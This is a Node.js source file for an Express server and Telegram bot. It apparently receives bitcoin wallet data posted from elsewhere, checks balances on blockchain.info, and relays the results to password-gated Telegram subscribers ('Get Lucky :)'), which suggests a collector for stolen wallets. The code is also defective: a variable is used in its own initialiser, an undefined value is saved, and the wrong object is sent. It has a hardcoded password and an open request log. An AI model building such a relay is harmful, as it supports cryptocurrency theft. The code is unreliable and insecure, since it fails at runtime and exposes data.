const axios = require('axios');
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

const {PORT, MONGODB_URI, TOKEN, URL} = process.env;

const bot = new TelegramBot(TOKEN);
bot.setWebHook(`${URL}/bot${TOKEN}`);

mongoose.connect(MONGODB_URI, {useCreateIndex: true, useNewUrlParser: true});

const Chat = mongoose.model('chat', new mongoose.Schema({
    chatId: {type: Number, unique: true}
}));

const Request = mongoose.model('request', new mongoose.Schema({
    body: String
}, {
    timestamps: true
}));

const app = express();

app.use(bodyParser.urlencoded({extended: false}));
app.use(bodyParser.json());
app.use(cors());

app.post(`/bot${TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

app.post('/notify', (req, res) => {
    axios(`https://blockchain.info/multiaddr?active=${req.body.text}`).then(result => {
        const balance = result.data.wallet.final_balance / 100000000;
        const text = `${text} - ${balance} BTC`;

        Chat.find({}, (err, result) => {
            for (let i in result) {
                bot.sendMessage(result[i].chatId, req.body);
            }
        });
    }).catch(err => {
        console.log(err.data);
    });

    const request = new Request();
    request.body = JSON.stringify(text);
    request.save();

    res.json({success: true});
});

app.get('/requests', (req, res) => {
    Request.find({}, (err, result) => {
        res.json(result);
    });
});

app.listen(PORT, () => {
    console.log(`Express server is listening on ${PORT}`);
});

bot.on('message', msg => {
    const {text} = msg;
    let message = '';

    if (text === '/start') {
        message = 'Hello, please ether password:';
    } else if (text === 'qwe@123') {
        const chat = new Chat();
        chat.chatId = msg.chat.id;
        chat.save();

        message = 'Congratulations, password is correct. Get Lucky :)';
    } else {
        message = 'Sorry, but your password incorrect';
    }

    bot.sendMessage(msg.chat.id, message);
});